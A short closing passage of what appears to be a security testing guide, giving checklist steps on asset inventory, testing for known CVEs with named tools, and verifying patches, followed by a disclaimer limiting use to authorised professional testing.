4. **Maintain an asset inventory** – know what components are running.
5. **Test for known CVEs** – use Nuclei, Metasploit, or manual exploitation.
6. **Verify patches** – ensure that updates are actually applied, not just claimed.

---

*This guide is for professional security testing purposes only. Unauthorized testing is illegal.*
